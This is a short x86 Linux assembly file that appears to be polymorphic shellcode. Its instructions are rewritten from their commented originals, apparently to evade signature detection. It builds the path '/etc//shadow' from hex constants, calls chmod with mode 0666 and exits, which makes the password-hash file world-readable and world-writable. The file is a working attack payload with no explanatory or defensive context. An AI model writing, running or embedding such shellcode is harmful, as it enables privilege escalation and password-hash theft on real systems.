section .text
        global _start
 
_start:
  ;xor eax, eax
  sub eax, eax
  
  push eax
  
  ;push dword 0x776f6461
  mov dword [esp-4], 0x776f6461
  
  ;push dword 0x68732f2f
  mov dword [esp-8], 0x68732f2f
  
  ;push dword 0x6374652f
  mov dword [esp-12], 0x6374652f

  sub esp, 12

  mov ebx,esp
  
  ;push word 0x1b6
  ;pop ecx
  push word 0x1b60
  pop ecx
  shr ecx, 4

  mov al,0xf
  int 0x80

  mov al,0x1
  int 0x80
